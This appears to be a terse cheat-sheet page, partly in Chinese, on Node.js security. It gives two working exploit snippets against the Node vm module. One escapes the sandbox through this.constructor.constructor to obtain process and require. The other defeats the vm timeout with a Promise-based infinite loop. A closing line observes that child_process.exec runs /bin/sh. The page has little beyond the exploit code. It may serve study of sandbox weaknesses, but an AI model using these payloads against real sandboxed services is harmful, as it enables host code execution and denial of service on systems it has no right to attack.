JavaScript
================================

沙箱逃逸
-------------------------------

exp

::

    const sandbox = {};
    const whatIsThis = vm.runInNewContext(`
        const ForeignObject = this.constructor;
        const ForeignFunction = ForeignObject.constructor;
        const process = ForeignFunction("return process")();
        const require = process.mainModule.require;
        require("fs");
    `, sandbox);

::

    vm.runInNewContext(
      'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
      {console:{log(){console.log.apply(console,arguments);}}},
      {timeout:5}
    );


命令执行
-------------------------------

Node.js中child_process.exec命令调用的是/bin/sh，故可以直接使用该命令执行shell